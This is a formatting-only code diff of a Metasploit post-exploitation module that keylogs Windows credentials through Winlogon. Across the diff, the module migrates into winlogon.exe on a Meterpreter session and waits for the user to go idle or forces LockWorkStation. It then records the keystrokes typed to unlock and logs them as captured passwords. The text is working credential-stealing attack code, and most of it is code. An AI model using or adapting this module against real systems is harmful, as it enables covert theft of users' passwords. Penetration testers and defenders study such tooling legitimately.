@@ -6,28 +6,33 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'         => 'Windows Capture Winlogon Lockout Credential Keylogger',
-      'Description'  => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Capture Winlogon Lockout Credential Keylogger',
+        'Description' => %q{
           This module migrates and logs Microsoft Windows user's passwords via
           Winlogon.exe using idle time and natural system changes to give a
-          false sense of security to the user.},
-      'License'      => MSF_LICENSE,
-      'Author'       => [ 'mubix', 'cg' ],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter'],
-      'References'   => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']]
-    ))
+          false sense of security to the user.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'mubix', 'cg' ],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'References' => [['URL', 'http://blog.metasploit.com/2010/12/capturing-windows-logons-with.html']]
+      )
+    )
 
     register_options(
-    [
-      OptInt.new('INTERVAL',[true, 'Time between key collection during logging',30]),
-      OptInt.new('HEARTBEAT',[true, 'Heart beat between idle checks',30]),
-      OptInt.new('LOCKTIME',[true, 'Amount of idle time before lockout',300]),
-      OptInt.new('PID',[false,'Target PID, only needed if multiple winlogon.exe instances exist',nil]),
-      OptBool.new('WAIT', [true, 'Wait for lockout instead of default method', false])
-    ])
+      [
+        OptInt.new('INTERVAL', [true, 'Time between key collection during logging', 30]),
+        OptInt.new('HEARTBEAT', [true, 'Heart beat between idle checks', 30]),
+        OptInt.new('LOCKTIME', [true, 'Amount of idle time before lockout', 300]),
+        OptInt.new('PID', [false, 'Target PID, only needed if multiple winlogon.exe instances exist', nil]),
+        OptBool.new('WAIT', [true, 'Wait for lockout instead of default method', false])
+      ]
+    )
   end
 
   def check_admin
@@ -57,7 +62,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  #Function for starting the keylogger
+  # Function for starting the keylogger
   def startkeylogger(session)
     begin
       print_status("Starting the keystroke sniffer...")
@@ -73,12 +78,12 @@ class MetasploitModule < Msf::Post
   def keycap(session, keytime, logfile)
     begin
       rec = 1
-      #Creating DB for captured keystrokes
+      # Creating DB for captured keystrokes
       print_status("Keystrokes being saved in to #{logfile}")
-      #Inserting keystrokes every number of seconds specified
+      # Inserting keystrokes every number of seconds specified
       print_status("Recording ")
       while rec == 1
-        #getting Keystrokes
+        # getting Keystrokes
         data = session.ui.keyscan_dump
         outp = ""
         data.unpack("n*").each do |inp|
@@ -86,11 +91,11 @@ class MetasploitModule < Msf::Post
           vk = (inp & 0xff)
           kc = VirtualKeyCodes[vk]
 
-          f_shift = fl & (1<<1)
-          f_ctrl	= fl & (1<<2)
-          f_alt	= fl & (1<<3)
+          f_shift = fl & (1 << 1)
+          f_ctrl	= fl & (1 << 2)
+          f_alt	= fl & (1 << 3)
 
-          if(kc)
+          if (kc)
             name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
             case name
             when /^.$/
@@ -105,14 +110,14 @@ class MetasploitModule < Msf::Post
             outp << " <0x%.2x> " % vk
           end
         end
-        select(nil,nil,nil,2)
-        file_local_write(logfile,"#{outp}\n")
+        select(nil, nil, nil, 2)
+        file_local_write(logfile, "#{outp}\n")
         if outp != nil and outp.chomp.lstrip != "" then
           print_status("Password?: #{outp}")
         end
         still_locked = 1
         # Check to see if the screen saver is on, then check to see if they have logged back in yet.
-        screensaver = client.railgun.user32.SystemParametersInfoA(114,nil,1,nil)['pvParam'].unpack("C*")[0]
+        screensaver = client.railgun.user32.SystemParametersInfoA(114, nil, 1, nil)['pvParam'].unpack("C*")[0]
         if screensaver == 0
           still_locked = client.railgun.user32.GetForegroundWindow()['return']
         end
@@ -126,9 +131,9 @@ class MetasploitModule < Msf::Post
         else
           print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
         end
-        select(nil,nil,nil,keytime.to_i)
+        select(nil, nil, nil, keytime.to_i)
       end
-    rescue::Exception => e
+    rescue ::Exception => e
       if e.message != 'win'
         print_line()
         print_status("#{e.class} #{e}")
@@ -138,20 +143,18 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def run
     # Log file variables
-    host,port = session.session_host, session.session_port
-    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")					# Create Filename info to be appended to downloaded files
-    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')		# Create a directory for the logs
-    ::FileUtils.mkdir_p(logs)											# Create the log directory
-    logfile = logs + ::File::Separator + host + filenameinfo + ".txt"			# Logfile name
+    host, port = session.session_host, session.session_port
+    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")	# Create Filename info to be appended to downloaded files
+    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')	# Create a directory for the logs
+    ::FileUtils.mkdir_p(logs)	# Create the log directory
+    logfile = logs + ::File::Separator + host + filenameinfo + ".txt"	# Logfile name
 
-
-    #Make sure we are on a Windows host
+    # Make sure we are on a Windows host
     if client.platform != 'windows'
-        print_error('This module does not support this platform.')
-        return
+      print_error('This module does not support this platform.')
+      return
     end
 
     # Check admin status
@@ -167,6 +170,7 @@ class MetasploitModule < Msf::Post
       if targetpid == 'exit'
         return
       end
+
       print_status("Found WINLOGON at PID:#{targetpid}")
     else
       targetpid = datastore['PID']
@@ -189,15 +193,15 @@ class MetasploitModule < Msf::Post
     # Override SystemParametersInfo Railgun call to check for Screensaver
     # Unfortunately 'pvParam' changes it's type for each uiAction so
     # it cannot be changed in the regular railgun defs
-    client.railgun.add_function('user32','SystemParametersInfoA','BOOL',[
-      ["DWORD","uiAction","in"],
-      ["DWORD","uiParam","in"],
-      ["PBLOB","pvParam","out"],
-      ["DWORD","fWinIni","in"]
+    client.railgun.add_function('user32', 'SystemParametersInfoA', 'BOOL', [
+      ["DWORD", "uiAction", "in"],
+      ["DWORD", "uiParam", "in"],
+      ["PBLOB", "pvParam", "out"],
+      ["DWORD", "fWinIni", "in"]
     ])
 
     print_good("Keylogging for #{client.info}")
-    file_local_write(logfile,"#{client.info}\n")
+    file_local_write(logfile, "#{client.info}\n")
     if datastore['WAIT'] then
       print_status("Waiting for user to lock out their session")
       locked = false
@@ -207,7 +211,7 @@ class MetasploitModule < Msf::Post
           print_status("Session has been locked out")
         else
           # sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this
-          select(nil,nil,nil, 2)
+          select(nil, nil, nil, 2)
         end
       end
     else
@@ -215,7 +219,7 @@ class MetasploitModule < Msf::Post
       print_status("System has currently been idle for #{currentidle} seconds")
       while currentidle <= datastore['LOCKTIME'] do
         print_status("Current Idle time: #{currentidle} seconds")
-        select(nil,nil,nil,datastore['HEARTBEAT'])
+        select(nil, nil, nil, datastore['HEARTBEAT'])
         currentidle = session.ui.idle_time
       end
       client.railgun.user32.LockWorkStation()
